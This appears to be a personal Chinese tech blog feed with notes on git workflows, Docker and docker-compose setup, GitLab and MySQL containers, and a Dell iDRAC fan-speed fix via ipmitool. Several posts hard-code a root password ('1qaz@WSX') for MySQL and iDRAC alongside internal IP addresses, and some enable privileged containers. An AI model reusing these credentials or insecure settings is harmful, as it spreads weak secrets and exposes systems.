        <content type="html"><![CDATA[<h1 id="新建项目仓库"><a href="#新建项目仓库" class="headerlink" title="新建项目仓库"></a>新建项目仓库</h1><h3 id="创建本地git项目"><a href="#创建本地git项目" class="headerlink" title="创建本地git项目"></a>创建本地git项目</h3><pre><code>git init</code></pre><p>git init &lt;仓库名&gt;没法执行，init后面不要跟参数当名字。</p><h3 id="github上创建一个仓库"><a href="#github上创建一个仓库" class="headerlink" title="github上创建一个仓库"></a>github上创建一个仓库</h3><p>登录github创建个空的仓库</p><h3 id="登录github创建个空的仓库，添加远程仓库"><a href="#登录github创建个空的仓库，添加远程仓库" class="headerlink" title="登录github创建个空的仓库，添加远程仓库"></a>登录github创建个空的仓库，添加远程仓库</h3><pre><code>git remote add origin https://github.com/xxx/xxx.git</code></pre><p>从远程master合并到本地master</p><pre><code class="lang-shell">git config --global user.name &quot;xxxx&quot; git config --global user.email xxxxx@xx.com</code></pre><pre><code class="lang-shell">git initgit add .git commit - m &quot;init&quot;git remote add origin https://github.com/xxx/xxx.gitgit push origin master</code></pre><p>如果有冲突就尝试（通常是你创建仓库的时候新建了什么readme和license）：<br>    git pull origin master:master</p><p>也可以直接强制推送：<br>    git push origin master —force</p><h3 id="提交本地分支到远程分支"><a href="#提交本地分支到远程分支" class="headerlink" title="提交本地分支到远程分支"></a>提交本地分支到远程分支</h3><pre><code>git push -u origin master</code></pre><h3 id="将现有项目添加并提交上传"><a href="#将现有项目添加并提交上传" class="headerlink" title="将现有项目添加并提交上传"></a>将现有项目添加并提交上传</h3><pre><code class="lang-shell">git add -A（git add . 是提交当前路径  git add -A 是提交整个文件夹子文件夹路径）git commit -m &#39;初始化git项目&#39;git push --set-upstream origin master</code></pre>]]></content>
      
      
      <categories>
          
          <category> Git </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>新建某分支并推送、合并分支</title>
      <link href="/2024/04/09/git/%E6%96%B0%E5%BB%BA%E6%9F%90%E5%88%86%E6%94%AF%E5%B9%B6%E6%8E%A8%E9%80%81%E8%87%B3%E6%9F%90%E5%88%86%E6%94%AF%EF%BC%9A%E4%BB%A5%E8%80%83%E8%AF%95%E7%B3%BB%E7%BB%9Fes%E4%B8%BA%E4%BE%8B%E7%89%88%E6%9C%AC%E7%AE%A1%E7%90%86/"/>
      <url>/2024/04/09/git/%E6%96%B0%E5%BB%BA%E6%9F%90%E5%88%86%E6%94%AF%E5%B9%B6%E6%8E%A8%E9%80%81%E8%87%B3%E6%9F%90%E5%88%86%E6%94%AF%EF%BC%9A%E4%BB%A5%E8%80%83%E8%AF%95%E7%B3%BB%E7%BB%9Fes%E4%B8%BA%E4%BE%8B%E7%89%88%E6%9C%AC%E7%AE%A1%E7%90%86/</url>
      
        <content type="html"><![CDATA[<h1 id="新建某分支并推送至某分支：以考试系统es为例版本管理"><a href="#新建某分支并推送至某分支：以考试系统es为例版本管理" class="headerlink" title="新建某分支并推送至某分支：以考试系统es为例版本管理"></a>新建某分支并推送至某分支：以考试系统es为例版本管理</h1><p>新建新分支并推送至新分支之前，需要检查当前分值是否还有未提交的状态</p><p><code>git status</code> # 可以检查是否有新文件未被track</p><p><code>git remote -v</code> # 查看远程分值，一般如下，同一个地址具有拿下或push的权限</p><pre><code>origin  http://shenyanjian.cn:3000/senranja/exam_system.git (fetch)origin  http://shenyanjian.cn:3000/senranja/exam_system.git (push)</code></pre><p><code>git fetch</code> # 拿下仓库最新分值信息。<code>git pull==git fetch + git merge</code>，git fetch是安全的、不会合并的命令</p><p><code>git branch -r</code> # 查看全部的远程分支，通常显示如下：（若远程分支只有main）</p><pre><code>  origin/HEAD -&gt; origin/main  origin/main</code></pre><p><code>git checkout -b V0.0.2</code> # 以当前分支为副本创建V0.0.2</p><p><code>git checkout V0.0.2</code> # 切换到分值V0.0.2</p><p>（现在在此处放一些部署文档、版本交付说明）</p><pre><code class="lang-shell">git add .git commit -m &quot;V0.0.2&quot;git push</code></pre><pre><code>fatal: The current branch V0.0.2 has no upstream branch.To push the current branch and set the remote as upstream, use    git push --set-upstream origin V0.0.2</code></pre><p>如上报错，意思是远程分值还没有V0.0.2，需要手动设置下</p><pre><code>git push --set-upstream origin V0.0.2</code></pre><p>完成</p><p>切换回主分支：</p><pre><code>git checkout main</code></pre><h1 id="本地合并其他分支到本分支，再推送"><a href="#本地合并其他分支到本分支，再推送" class="headerlink" title="本地合并其他分支到本分支，再推送"></a>本地合并其他分支到本分支，再推送</h1><p>要将本地的 dev 分支合并到 main 分支，你可以按照以下步骤进行操作：</p><p>确保你当前位于 main 分支上。你可以通过以下命令来确保：</p><pre><code>git checkout main</code></pre><p>然后，执行 git pull 命令来确保你的 main 分支是最新的：</p><pre><code>git pull origin main</code></pre><p>接着，执行 git merge 命令来合并 dev 分支到 main 分支：</p><pre><code>git merge dev</code></pre><p>如果有冲突，在合并过程中会停下来，需要你解决这些冲突。解决完冲突后，你需要执行 <code>git add</code>命令来标记冲突已解决的文件，然后执行 <code>git merge --continue</code> 来继续合并过程。</p><p>最后，当合并完成，你可以将合并后的 main 分支推送到远程仓库：</p><pre><code>git push origin main</code></pre><p>通过这些步骤，你就可以将本地的 dev 分支成功合并到 main 分支，并将更新推送到远程仓库。</p>]]></content>
      
      
      <categories>
          
          <category> Git </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>push existed local repo</title>
      <link href="/2024/04/09/git/%E7%8E%B0%E6%9C%89%E4%BB%93%E5%BA%93%E6%8F%90%E4%BA%A4/"/>
      <url>/2024/04/09/git/%E7%8E%B0%E6%9C%89%E4%BB%93%E5%BA%93%E6%8F%90%E4%BA%A4/</url>
      
        <content type="html"><![CDATA[<h1 id="现有仓库提交到github"><a href="#现有仓库提交到github" class="headerlink" title="现有仓库提交到github"></a>现有仓库提交到github</h1><h3 id="纯新建项目push"><a href="#纯新建项目push" class="headerlink" title="纯新建项目push"></a>纯新建项目push</h3><pre><code class="lang-shell">echo &quot;# licenseGenerator&quot; &gt;&gt; README.mdgit initgit add README.mdgit commit -m &quot;first commit&quot;git branch -M mastergit remote add origin https://github.com/SenRanja/licenseGenerator.gitgit push -u origin master</code></pre><h3 id="push已存在项目"><a href="#push已存在项目" class="headerlink" title="push已存在项目"></a>push已存在项目</h3><p>先做的：如果你手贱，github创建项目的时候，新建了什么license、readme有的没的的东西，本地push之前，得先git pull 一下：</p><pre><code>git pull github master --allow-unrelated-histories</code></pre><p>（git pull 远程名字 远程分支， 后面的 –allow-unreleated-histories ，比如你手贱新建了license，你git pull 的时候会拒绝，因为github新建项目弄的license有第一次的commit，和你本地历史对不上merge默认不允许，所以你得手动指定）</p><p>比如，如果本地gitea已经有项目了，应该是推送此处。<br>比如，我的evo系统，在本地已经推送gitea，默认的远程地址名字 origin 必须重命名。</p><pre><code>git remote add origin https://github.com/SenRanja/licenseGenerator.gitgit branch -M master</code></pre><p>（git branch -M 命令用于重命名当前分支。具体来说，-M 选项告诉 Git 强制重命名分支，即使新的分支名与已存在的分支名冲突也会强制执行。这个命令的常见用途是将当前分支重命名为一个新的分支名。）</p><pre><code>git push -u origin master</code></pre><p>更改origin的远程名字的命令如下：</p><pre><code>git remote add github https://github.com/SenRanja/licenseGenerator.gitgit branch -M master</code></pre><p>（强行将现在所在分支，重命名为 master 分支）</p><pre><code>git push -u github master</code></pre><p>（将本地的master分支代码提交到 github 的远程链接上）</p>]]></content>
      
      
      <categories>
          
          <category> Git </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>构建gitleaks-Docker服务</title>
      <link href="/2024/04/09/docker/docker-compose+dockerfile%EF%BC%9A%E6%9E%84%E5%BB%BAgitleaks-Docker%E6%9C%8D%E5%8A%A1/"/>
      <url>/2024/04/09/docker/docker-compose+dockerfile%EF%BC%9A%E6%9E%84%E5%BB%BAgitleaks-Docker%E6%9C%8D%E5%8A%A1/</url>
      
        <content type="html"><![CDATA[<p>两个一块儿用，Dockerfile在docker-compose.yaml的同目录下。</p><h1 id="Dockerfile"><a href="#Dockerfile" class="headerlink" title="Dockerfile"></a>Dockerfile</h1><pre><code>FROM amd64/alpine:3.14RUN apk update &amp;&amp; apk add git &amp;&amp; apk add tzdata &amp;&amp; cp /usr/share/zoneinfo/Asia/Shanghai /etc/localtime &amp;&amp; echo &quot;Asia/Shanghai&quot; &gt; /etc/timezone &amp;&amp; apk del tzdataADD ./SecretDetectionDir /webscan/WORKDIR /webscanEXPOSE 8000ENTRYPOINT [&quot;/webscan/http&quot;]</code></pre><h1 id="docker-compose-yaml"><a href="#docker-compose-yaml" class="headerlink" title="docker-compose.yaml"></a>docker-compose.yaml</h1><pre><code>version: &quot;3&quot;services:secretdetection_docker:    build: .    container_name: secretdetection_http    ports:    - &quot;8000:8000&quot;    restart: always</code></pre>]]></content>
      
      
      <categories>
          
          <category> Docker </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>docker-compose调试和操作</title>
      <link href="/2024/04/09/docker/docker-compose%E8%B0%83%E8%AF%95/"/>
      <url>/2024/04/09/docker/docker-compose%E8%B0%83%E8%AF%95/</url>
      
        <content type="html"><![CDATA[<h1 id="方便调试的技巧"><a href="#方便调试的技巧" class="headerlink" title="方便调试的技巧"></a>方便调试的技巧</h1><pre><code>docker-compose down &amp;&amp; docker-compose rebuild &amp;&amp; docker-compose up -d</code></pre><h1 id="docker-compose操作"><a href="#docker-compose操作" class="headerlink" title="docker-compose操作"></a>docker-compose操作</h1><pre><code>docker-compose build 构建镜像，镜像文件会存在docker images中docker-compose up -d 启动容器docker-compose down 移除容器（这点我以前以为down是类似于docker stop的命令，没想到docker-compose down是移除的意思，导致删库）docker-compose stop 暂停容器运行</code></pre><h1 id="导出导入操作"><a href="#导出导入操作" class="headerlink" title="导出导入操作"></a>导出导入操作</h1><p>参考链接:<a href="https://www.hangge.com/blog/cache/detail_2411.html">https://www.hangge.com/blog/cache/detail_2411.html</a></p><p>不过需要注意一下，导入导出的时候最好根据<code>docker ps -a</code>的 名字来操作，不要根据 container id 来操作。否则导入的时候，显示的名字可能是 <none>。这个时候虽然容器可以正常运行，但是很多人会感觉<none>是错误的。</none></none></p><p>最重要的注意，<strong>docker-compose无法构建容器为镜像，而且也不会复制外部目录到内部</strong>，有的仅仅是volumns: xxx:xxx的挂载。如果容器是使用的挂载目录，而不是复制进去的文件，那么会无法运行相应目录中的文件和程序。</p><p>所以Dockerfile和dockerf-compose.yml结合使用。</p><h1 id="容器：export和import"><a href="#容器：export和import" class="headerlink" title="容器：export和import"></a>容器：export和import</h1><pre><code>docker export f299f501774c &gt; hangger_server.tardocker import - new_hangger_server &lt; hangger_server.tar</code></pre><h1 id="镜像：save和load"><a href="#镜像：save和load" class="headerlink" title="　镜像：save和load"></a>　镜像：save和load</h1><p>（1）下面使用 docker save 命令根据 ID 将镜像保存成一个文件。</p><pre><code>docker save 0fdf2b4c26d3 &gt; hangge_server.tar</code></pre><p><strong>(这么打包，是没有标签名字的。最好指定镜像标签名而非镜像id打包)</strong></p><p>（2）我们还可以同时将多个 image 打包成一个文件，比如下面将镜像库中的 postgres 和 mongo 打包：</p><pre><code>docker save -o images.tar postgres:9.6 mongo:3.4</code></pre><p>载入镜像</p><pre><code>docker load &lt; hangge_server.tar</code></pre><h1 id="SD的镜像打包及运行"><a href="#SD的镜像打包及运行" class="headerlink" title="SD的镜像打包及运行"></a>SD的镜像打包及运行</h1><h3 id="打包导出"><a href="#打包导出" class="headerlink" title="打包导出"></a>打包导出</h3><p>先命名个版本</p><pre><code>docker tag f0b0777d65d7 sd_secretdetection_docker:2.3</code></pre><p>打包，不要根据镜像id打包，不然未来没有名字，得指定tag：</p><pre><code>docker save -o sd-2.3.tar sd_secretdetection_docker:2.3</code></pre><p>加载运行</p><pre><code>docker load &lt; sd-2.3.tardocker run -itd -p 8000:8000 sd_secretdetection_docker:2.3</code></pre><p>run镜像，并指定容器名字</p><p>指定镜像名字:</p><pre><code>docker run --name my_container my_imagedocker load &lt; shenyanjian.tardocker run -itd -p 8000:8000 --name secretdetection shenyanjian_secretdetection_docker:latest</code></pre><p>将容器保存为本地镜像</p><pre><code>docker commit -a &quot;blingsec&quot; -m &quot;sd2.0&quot; secret_detection_http secret_detection_http:v2.0</code></pre><p>-a是作者名，-m 是标注信息，最后的secret_detection_http:v2.0 是命名</p>]]></content>
      
      
      <categories>
          
          <category> Docker </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>docker network</title>
      <link href="/2024/04/09/docker/docker-network/"/>
      <url>/2024/04/09/docker/docker-network/</url>
      
        <content type="html"><![CDATA[<h1 id="docker-network网络的优势"><a href="#docker-network网络的优势" class="headerlink" title="docker network网络的优势"></a><strong>docker network网络的优势</strong></h1><p>同一个 Docker <strong>网络中的容器之间可以使用容器名进行网络通信，就像访问域名一样</strong>。这是因为 Docker 默认提供了一个内置的 DNS 服务，它会为在同一网络中运行的容器分配主机名，并且其他容器可以使用这些主机名进行通信。</p><h1 id="创建docker-network"><a href="#创建docker-network" class="headerlink" title="创建docker network"></a>创建docker network</h1><p>使用 Docker 网络：另一种可能的解决方案是创建一个新的 Docker 网络，并在这个网络上运行你的容器。你可以使用 docker network create 命令创建一个新的网络，然后使用 —network 选项运行你的容器。</p><p>调整防火墙规则：如果你的主机上运行有防火墙，可能需要调整防火墙规则以允许 Docker 容器访问内网。具体的步骤取决于你的防火墙软件和配置。</p><p><strong>检查 DNS 配置：如果你的问题与 DNS 解析有关，可能需要检查和调整你的 Docker 容器的 DNS 配置。你可以通过在 Docker 守护进程的配置文件（例如 /etc/docker/daemon.json）中设置 dns 选项来全局配置 DNS，也可以使用 —dns 选项在运行容器时指定 DNS。</strong></p><p><strong>使用 VPN：如果你的内网服务在 VPN 后面，你可能需要在 Docker 容器中设置 VPN。这可能需要在你的 Docker 镜像中安装和配置 VPN 客户端。</strong></p>]]></content>
      
      
      <categories>
          
          <category> Docker </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>docker volume</title>
      <link href="/2024/04/09/docker/docker-volume/"/>
      <url>/2024/04/09/docker/docker-volume/</url>
      
        <content type="html"><![CDATA[<p>docker volume 有 ls rm等子命令</p><p>使用 docker rm 命令删除容器时，默认情况下不会删除与该容器关联的挂载的 <strong>Docker 卷（Docker volume）</strong>。Docker volume 是一个独立于容器的数据存储区域，通常用于持久化存储容器内的数据。</p><p>如果您使用了 -v 参数来挂载卷，那么删除容器时不会删除这个卷。要删除与容器关联的卷，您需要使用 docker volume rm 命令。</p><p>例如，如果您的容器启动命令中有如下的 -v 参数：</p><pre><code>docker run -v /host/path:/container/path my_image</code></pre><p>那么删除容器时，卷 /host/path 不会被自动删除。要手动删除该卷，可以运行以下命令：</p><pre><code>docker volume rm $(docker volume ls -qf &quot;mount=/host/path&quot;)</code></pre><p>这将删除与指定路径关联的 Docker 卷。请注意替换 /host/path 为实际使用的卷路径。</p><p>总之，docker rm 默认不会删除挂载的 Docker 卷，您需要使用 docker volume rm 命令手动删除它们。</p>]]></content>
      
      
      <categories>
          
          <category> Docker </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>dockerhub &amp;&amp; docker</title>
      <link href="/2024/04/09/docker/docker/"/>
      <url>/2024/04/09/docker/docker/</url>
      
        <content type="html"><![CDATA[<h1 id="中国用户换源"><a href="#中国用户换源" class="headerlink" title="中国用户换源"></a>中国用户换源</h1><pre><code>vim /etc/docker/daemon.json&#123;&quot;registry-mirrors&quot;:[&quot;https://hub-mirror.c.163.com&quot;,&quot;https://registry.aliyuncs.com&quot;,&quot;https://registry.docker-cn.com&quot;,&quot;https://docker.mirrors.ustc.edu.cn&quot;]&#125;service docker restart</code></pre><h1 id="dockerhub"><a href="#dockerhub" class="headerlink" title="dockerhub"></a>dockerhub</h1><p>log in <a href="https://hub.docker.com/">https://hub.docker.com/</a>, register an account.</p><p>pull your private image</p><pre><code>docker pull senranja/secret_detection</code></pre><p>build an image with tag, upload image to dockerhub</p><pre><code>docker image build -t senranja/secret_detection:v2.1 .docker logindocker push username/repo:tag</code></pre><h1 id="搭建gitlab-ce为例"><a href="#搭建gitlab-ce为例" class="headerlink" title="搭建gitlab-ce为例"></a>搭建gitlab-ce为例</h1><p>安装gitlab-ce参考链接：</p><pre><code>https://blog.csdn.net/BThinker/article/details/124097795</code></pre><p>查找镜像</p><pre><code>docker search gitlab</code></pre><p>拉取Gitlab镜像</p><pre><code>docker pull gitlab/gitlab-ce:latest</code></pre><p>启动容器，这里docker run命令的-v和dockerfile以及docker-compose.yaml中的-v 挂在目录，不需要你自己手动创建目录。即便目录不存在，他会自动创建。</p><pre><code>docker run \-itd  \-p 9980:80 \-p 9922:22 \-v /home/gitlab/etc:/etc/gitlab  \-v /home/gitlab/log:/var/log/gitlab \-v /home/gitlab/opt:/var/opt/gitlab \--restart always \--privileged=true \--name gitlab \gitlab/gitlab-ce</code></pre><p>命令</p><pre><code>-i     以交互模式运行容器，通常与 -t 同时使用命令解释-t     为容器重新分配一个伪输入终端，通常与 -i 同时使用-d    后台运行容器，并返回容器ID-p 9980:80    将容器内80端口映射至宿主机9980端口，这是访问gitlab的端口-p 9922:22     将容器内22端口映射至宿主机9922端口，这是访问ssh的端口-v /home/gitlab/etc:/etc/gitlab    将容器/etc/gitlab目录挂载到宿主机/usr/local/gitlab-test/etc目录下，若宿主机内此目录不存在将会自动创建，其他两个挂载同这个一样--restart always    容器自启动--privileged=true    让容器获取宿主机root权限--name gitlab    设置容器名称为gitlabgitlab/gitlab-ce    镜像的名称，这里也可以写镜像ID</code></pre><h1 id="复制目录细节"><a href="#复制目录细节" class="headerlink" title="复制目录细节"></a>复制目录细节</h1><p>屁股加不加 /没区别</p><ol><li><p>目录下文件复制到目标目录下，不包含目录本身</p><p>COPY ./dist/ /usr/share/nginx/html/</p></li></ol><p>是将 ./dist/下文件 放入 /html/，dist本身没目录</p><ol><li><p>连带这个目录复制进入</p><p>COPY ./dist /usr/share/nginx/html/dist</p></li></ol><h1 id="删除none镜像"><a href="#删除none镜像" class="headerlink" title="删除none镜像"></a>删除none镜像</h1><pre><code>docker images -a | grep &quot;&lt;none&gt;&quot; | awk &#39;&#123;print $3&#125;&#39; | xargs docker rmi</code></pre>]]></content>
      
      
      <categories>
          
          <category> Docker </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>gitlab EE实例</title>
      <link href="/2024/04/09/docker/dockerfile%EF%BC%9Agitlab%20EE%E5%AE%9E%E4%BE%8B/"/>
      <url>/2024/04/09/docker/dockerfile%EF%BC%9Agitlab%20EE%E5%AE%9E%E4%BE%8B/</url>
      
        <content type="html"><![CDATA[<pre><code>version: &#39;3.8&#39;services:gitlab:    image: &#39;gitlab/gitlab-ee:15.3.5-ee.0&#39;    container_name: &#39;gitlab-ee&#39;    restart: always    hostname: 192.168.3.199    privileged: true    shm_size: &#39;2gb&#39;    environment:    GITLAB_OMNIBUS_CONFIG: |        external_url &#39;http://192.168.3.199:40080&#39;        gitlab_rails[&#39;gitlab_shell_ssh_port&#39;] = 40022    ports:    - 40080:40080    - 40443:40443    - &quot;40022:22&quot;    volumes:    - &#39;./storage/config:/etc/gitlab&#39;    - &#39;./storage/logs:/var/log/gitlab&#39;    - &#39;./storage/data:/var/opt/gitlab&#39;</code></pre>]]></content>
      
      
      <categories>
          
          <category> Docker </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>只能有root操作docker，普通用户无法操作dockers处理方法</title>
      <link href="/2024/04/09/docker/docker%E5%85%81%E8%AE%B8%E9%9D%9Eroot/"/>
      <url>/2024/04/09/docker/docker%E5%85%81%E8%AE%B8%E9%9D%9Eroot/</url>
      
        <content type="html"><![CDATA[<p>参考链接: <a href="https://www.cnblogs.com/-mrl/p/13836631.html">https://www.cnblogs.com/-mrl/p/13836631.html</a></p><p>看当前系统中的用户和组：</p><pre><code>1、用户列表文件：cat /etc/passwd2、用户组列表文件：cat /etc/group</code></pre><h1 id="创建docker组"><a href="#创建docker组" class="headerlink" title="创建docker组"></a>创建docker组</h1><pre><code>vagrant@ubuntu18:~$ sudo groupadd dockergroupadd: group ‘docker‘ already exists</code></pre><h1 id="将当前用户加入docker组"><a href="#将当前用户加入docker组" class="headerlink" title="将当前用户加入docker组"></a>将当前用户加入docker组</h1><pre><code>vagrant@ubuntu18:~$ sudo gpasswd -a $&#123;USER&#125; dockerAdding user xxx to group docker</code></pre><h1 id="重启docker服务"><a href="#重启docker服务" class="headerlink" title="重启docker服务"></a>重启docker服务</h1><pre><code>vagrant@ubuntu18:~$ sudo service docker restart</code></pre><h1 id="刷新docker组成员"><a href="#刷新docker组成员" class="headerlink" title="刷新docker组成员"></a>刷新docker组成员</h1><pre><code>vagrant@ubuntu18:~$ newgrp docker#再试试命令^_^vagrant@ubuntu18:~$ docker imagesREPOSITORY          TAG                 IMAGE ID            CREATED             SIZE</code></pre><p>然后当前的shell退了重新开一个，这样你目前的用户就可以操作docker images 命令。</p>]]></content>
      
      
      <categories>
          
          <category> Docker </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>chown cannot dereference</title>
      <link href="/2024/04/09/docker/mysql-chown-err/"/>
      <url>/2024/04/09/docker/mysql-chown-err/</url>
      
        <content type="html"><![CDATA[<p>疑难杂症：拷贝mysql原始目录到其他目录，报错</p><pre><code>chown: cannot dereference &#39;/var/lib/mysql/mysql.sock&#39;: No such file or directory</code></pre><p>模仿此贴<br><a href="https://github.com/docker-library/mysql/issues/939">https://github.com/docker-library/mysql/issues/939</a></p><p><img src="/2024/04/09/docker/mysql-chown-err/2024-04-10-21-36-32.png" alt="2024-04-10-21-36-32"></p><p>解决</p><p>原因是复制docker数据过来的时候没有保持原先文件的chown属性</p><p>不需要设置privileged: true  # 允许特权模式 属性</p>]]></content>
      
      
      <categories>
          
          <category> Docker </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>mysql-docker</title>
      <link href="/2024/04/09/docker/mysql-docker/"/>
      <url>/2024/04/09/docker/mysql-docker/</url>
      
        <content type="html"><![CDATA[<p>mysql的docker：<a href="https://registry.hub.docker.com/_/mysql">https://registry.hub.docker.com/_/mysql</a></p><p>我的文件名称是docker-compose-basic.yml,MySQL数据挂载到宿主机/root/basic/mysql下</p><p>数据库一般需要将数据挂载到宿主机上,以免容器损坏导致数据丢失</p><pre><code>version: &#39;3&#39;services:#mysqlmysql:    image: mysql:5.6    container_name: mysql    environment:    - MYSQL_ROOT_PASSWORD=1qaz@WSX    - TZ=Asia/Shanghai    - SET_CONTAINER_TIMEZONE=true    - CONTAINER_TIMEZONE=Asia/Shanghai    volumes:    - ./mysql/conf:/etc/mysql/conf.d    - ./mysql/conf:/etc/mysql/mysql.conf.d    - ./mysql/data:/var/lib/mysql    - ./mysql/logs:/var/log/mysql    - /etc/localtime:/etc/localtime:ro    ports:    - 13306:3306    restart: always</code></pre><p>关于修改配置文件my.cnf(类似于my.ini)这种文件，上面已经指向了/etc/mysql/mysql.conf.d和/etc/mysql/conf.d两处配置文件的目录，但是完全可以在上面的挂载目录下新建my.cnf。因为我们的cnf文件也是配置文件。</p>]]></content>
      
      
      <categories>
          
          <category> Docker </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>开启ipv4转发</title>
      <link href="/2024/04/09/docker/%E5%BC%80%E5%90%AFipv4%E8%BD%AC%E5%8F%91/"/>
      <url>/2024/04/09/docker/%E5%BC%80%E5%90%AFipv4%E8%BD%AC%E5%8F%91/</url>
      
        <content type="html"><![CDATA[<h1 id="无法访问到docker映射出来的端口"><a href="#无法访问到docker映射出来的端口" class="headerlink" title="无法访问到docker映射出来的端口"></a>无法访问到docker映射出来的端口</h1><p>临时开启ipv4转发</p><pre><code>echo 1 &gt;/proc/sys/net/ipv4/ip_forward</code></pre><p>并重启docker服务</p><pre><code>service docker restart</code></pre><p>永久开启路由功能</p><pre><code>vim /etc/sysctl.confnet.ipv4.ip_forward = 1</code></pre><p>然后容器内也能上网了</p>]]></content>
      
      
      <categories>
          
          <category> Docker </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>构建blingTrendsAPIServer</title>
      <link href="/2024/04/09/docker/%E6%9E%84%E5%BB%BAblingTrendsAPIServer/"/>
      <url>/2024/04/09/docker/%E6%9E%84%E5%BB%BAblingTrendsAPIServer/</url>
      
        <content type="html"><![CDATA[<p>amd64/alpine:3.14足够小</p><pre><code>FROM amd64/alpine:3.14ADD . /api-server/RUN apk update &amp;&amp; apk add tzdata &amp;&amp; cp /usr/share/zoneinfo/Asia/Shanghai /etc/localtime &amp;&amp; echo &quot;Asia/Shanghai&quot; &gt; /etc/timezone &amp;&amp; apk del tzdata &amp;&amp; apk add --update --no-cache python3 py3-pip &amp;&amp; python3 -m pip install -r /api-server/requirements.txtWORKDIR /api-serverEXPOSE 5000ENTRYPOINT [&quot;python3&quot;, &quot;/api-server/blingTrendsAPIServer.py&quot;]</code></pre><p>推荐dockerfile部署，目前已部署在192.168.3.203:5000。</p><p>默认使用5000端口，自行考虑防火墙端口开放，如ubuntu使用<code>sudo ufw allow 5000/tcp</code>放开端口；</p><p>目前连接数据库是<code>192.168.3.203:23306</code>，docker默认bridge模式，要访问203数据库需要<code>sudo ufw allow 23306/tcp</code></p><p>如果需要指定端口映射，自行更改参数<code>docker run -p &lt;host-port&gt;:&lt;container-port&gt; &lt;image-name&gt;</code></p><pre><code># 构建后大小为77.5MBdocker build -t bling-trends-server .# 运行命令docker run --name bling_trends_server_container -itd -p 5000:5000 bling-trends-server</code></pre>]]></content>
      
      
      <categories>
          
          <category> Docker </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>构建gitleaks-Docker服务</title>
      <link href="/2024/04/09/docker/%E7%BA%AFdocker-compose%E6%97%A0dockerfile%EF%BC%9A%E6%9E%84%E5%BB%BAgitleaks-Docker%E6%9C%8D%E5%8A%A1/"/>
      <url>/2024/04/09/docker/%E7%BA%AFdocker-compose%E6%97%A0dockerfile%EF%BC%9A%E6%9E%84%E5%BB%BAgitleaks-Docker%E6%9C%8D%E5%8A%A1/</url>
      
        <content type="html"><![CDATA[<p>在上面gitleaks的docker-compose+Dockerfile的组合之后，我想写个纯docker-compose无dockerfile的版本。</p><p>即使用docker-compose完全替代Dockerfile。</p><p>docker-compose</p><p>entrypoint不好用，我查阅资料说是类似于Dockerfile的RUN，在容器启动之前的构件中会运行，但是怎么测试都不对。</p><p>干脆把RUN中的命令写到最后的command构建命令中。<br>涉及command命令，注意使用docker-compose logs看日志，有可能无限重复运行command命令</p><pre><code>version: &quot;3&quot;services:secretdetection_docker:    image: amd64/alpine:3.14    # entrypoint: [&quot;/secretDetection/entrypoint.sh&quot;]    # entrypoint: &quot;/bin/sh -c &quot;apk update &amp;&amp; apk add git &amp;&amp; apk add tzdata &amp;&amp; cp /usr/share/zoneinfo/Asia/Shanghai /etc/localtime &amp;&amp; echo &quot;Asia/Shanghai&quot; &gt; /etc/timezone &amp;&amp; apk del tzdata&quot;    container_name: secret_detection_http    ports:    - &quot;8000:8000&quot;    restart: always    volumes:    - ./SecretDetectionDir:/secretDetection/    restart: always    working_dir: /secretDetection/    # command: /secretDetection/http    command: /bin/sh -c &quot;apk update &amp;&amp; apk add git &amp;&amp; apk add tzdata &amp;&amp; cp /usr/share/zoneinfo/Asia/Shanghai /etc/localtime &amp;&amp; echo &quot;Asia/Shanghai&quot; &gt; /etc/timezone &amp;&amp; apk del tzdata &amp;&amp; /secretDetection/http&quot;</code></pre>]]></content>
      
      
      <categories>
          
          <category> Docker </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Dell 730风扇速度调整</title>
      <link href="/2024/04/08/Linux-Maintain/Dell730change_fans/"/>
      <url>/2024/04/08/Linux-Maintain/Dell730change_fans/</url>
      
        <content type="html"><![CDATA[<p>鹏哥的文章<br><a href="https://h38ozbw2bw.feishu.cn/docx/Jonpd4cZmoZW2Sx0RrVcXGRsnOc">https://h38ozbw2bw.feishu.cn/docx/Jonpd4cZmoZW2Sx0RrVcXGRsnOc</a></p><h1 id="现象"><a href="#现象" class="headerlink" title="现象"></a>现象</h1><p>dell emc 风扇转速100%<br>730安装的显卡为A2，非dell官方指定的显卡，bios主动调速速率为100%，cpu占用率低下，但是风扇全功率运行，声音一言难尽。</p><p>环境说明：</p><pre><code>Idrac ip:192.168.3.250</code></pre><p>如果有多余网线，可以直接接入到公司网络，如果不方便，将自己的电脑以太网网口配置为如下，可以用网线和服务器直连。</p><h1 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h1><p>使用ipmitool手动调速<br>ipmitool安装：</p><pre><code>apt install ipmitool</code></pre><p>github地址：<a href="https://github.com/ipmitool/ipmitool">https://github.com/ipmitool/ipmitool</a></p><p>windows下载地址：<a href="https://www.dell.com/support/home/zh-cn/drivers/driversdetails?driverid=m63f3">https://www.dell.com/support/home/zh-cn/drivers/driversdetails?driverid=m63f3</a></p><p>调速命令：</p><p>首先要关闭风扇自动调速功能，否则我们手动设置的转速是不会生效的。最后的0x00表示关闭自动调速，0x01表示开启自动调速。</p><pre><code>ipmitool -I lanplus -H 192.168.3.250 -U root -P 1qaz@WSX raw 0x30 0x30 0x01 0x00</code></pre><p>关闭自动调速之后，我们就可以按照我们自己的意愿来调整转速了，我这边设置为50%。</p><pre><code>ipmitool -I lanplus -H 192.168.3.250 -U root -P 1qaz@WSX raw 0x30 0x30 0x02 0xff 0x32</code></pre><p>最后的0x0a表示转速的百分比的十六进制，0a表示10%，0f表示15%。</p><p><img src="/2024/04/08/Linux-Maintain/Dell730change_fans/2024-04-10-21-58-11.png" 